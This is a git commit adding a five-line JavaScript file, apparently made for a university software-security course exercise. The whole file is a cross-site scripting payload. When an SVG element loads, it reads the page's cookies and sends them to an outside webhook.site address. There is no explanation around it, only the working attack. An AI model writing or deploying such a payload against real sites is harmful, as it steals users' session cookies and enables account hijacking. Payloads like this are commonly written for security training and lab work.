a488371bf6b0f168c41677c8349b25679bdbd1c3
Miguel Fernandes <miguel.e.fernandes@tecnico.ulisboa.pt>
2024-12-06 15:51:00 +0000

    Create SSof-script.js

---
+++ SSof-script.js
@@ -0,0 +1,5 @@
+document.getElementById('svgElement').onload = function () {
+  fetch('https://webhook.site/0e4ef618-76a4-49c5-8866-6a67ab89e60d?cookie=' + document.cookie, {
+    mode: 'no-cors',
+  });
+};
